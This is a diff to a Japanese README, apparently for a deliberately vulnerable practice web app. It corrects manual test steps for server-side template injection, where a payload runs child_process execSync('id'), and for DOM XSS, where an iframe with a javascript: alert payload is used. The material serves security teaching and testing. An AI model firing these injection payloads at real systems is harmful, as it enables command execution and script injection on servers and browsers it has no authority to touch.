@@ -71,11 +71,11 @@ npm run test:api2
 #### SSTi
 - 適当なユーザーでログインしてプロフィールを表示
 - usernameに以下、どちらも入れて保存してみる。  
-  `#{6*6}`, `#{global.process.mainModule.require('child_process').execSync('id').toString()} `
+  `#{6*6}`, `#{global.process.mainModule.require('child_process').execSync('id').toString()}`
 
 #### DOM XSS
 - 検索ボックスに以下を入力して検索  
-  `<iframe src="javascript:alert(`xss`)">`
+  `<iframe src="javascript:alert('xss')">`
   ※エスケープされないようにしてください。
 
 #### Reflected XSS
